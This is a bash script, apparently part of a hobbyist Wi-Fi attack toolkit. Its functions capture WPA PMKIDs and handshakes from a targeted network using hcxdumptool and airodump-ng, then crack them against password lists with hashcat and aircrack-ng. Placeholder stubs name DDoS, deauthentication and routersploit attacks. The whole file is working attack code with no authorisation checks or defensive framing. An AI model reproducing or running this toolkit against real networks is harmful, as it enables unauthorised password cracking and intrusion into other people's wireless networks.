source "lib/capture-pmkid.sh"
source "lib/capture-handshake.sh"
source "lib/crack-pmkid.sh"
source "lib/crack-handshake.sh"


capture-pmkid() {
    network-scan-1
    echo ""
    read -p "File name to save as: " FILE1
    echo ""
    echo "During Capture press "CTRL + C" to stop"
    read -n 1 -r -s -p "Press any button to begin capture..."
    clear
    hcxdumptool -i "$INTERFACE" -o "$FILE1".pcapng --enable_status=1 -c "$CHANNEL1"
    hcxpcaptool -E essidlist -I identitylist -U usernamelist -z "$FILE1".16800 "$FILE1".pcapng
    mv "$FILE1".pcapng PMKID
    mv "$FILE1".16800 PMKID
    rm -R identitylist
    rm -R essidlist
    sleep 1
    clear
    echo "PMKID File Saved"
    echo "File Converted"
    ifconfig "$INTERFACE" down
    iwconfig "$INTERFACE" mode managed
    ifconfig "$INTERFACE" up
    sleep 2
    main-choice-1
}
capture-handshake() {
    network-scan-2
    echo ""
    read -p "File name to save as: " FILE2
    echo ""
    echo "During Capture press "CTRL + C" to stop"
    read -n 1 -r -s -p "Press any button to begin capture..."
    airodump-ng -c$CHANNEL2 -w "$FILE2" -d "$BSSID2" "$INTERFACE"
    clear
    rm "$FILE2"-01.csv
    rm "$FILE2"-01.kismet.csv
    rm "$FILE2"-01.kismet.netxml
    rm "$FILE2"-01.log.csv
    mv "$FILE2"-01.cap Handshake/
    echo "Handshake File Saved"
    echo "Files cleaned"
    echo "File moved"
    ifconfig "$INTERFACE" down
    iwconfig "$INTERFACE" mode managed
    ifconfig "$INTERFACE" up
    sleep 1
    main-choice-1
}

crack-pmkid() {
    show-pmkids
    choose-list-2
    clear
    cd ~/Programs/autoScript
    hashcat -m 16800 PMKID/$CHOSEN_PMKID -a 0 --kernel-accel=1 -w 3 --force Password-List/$SELECTED_LIST
    #sleep 2
    #main-menue
}
crack-handshake() {
    choose-file-1
    choose-list-1
    clear
    aircrack-ng Handshake/$CHOSEN_FILE -w Password-List/$SELECTED_LIST
    sleep 5
    main-choice-1
}
capture-packets() {
    coming-soon
}
geolocate() {
    coming-soon
}
scan-ports() {
    coming-soon
}
nmap-scan() {
    coming-soon
}
ddos-ip() {
    coming-soon
}
ddos-website() {
    coming-soon
}
deauth-network() {
    coming-soon
}
deauth-device() {
    coming-soon
}
router-sploit() {
    coming-soon
}
airgeddon-void() {
    coming-soon
}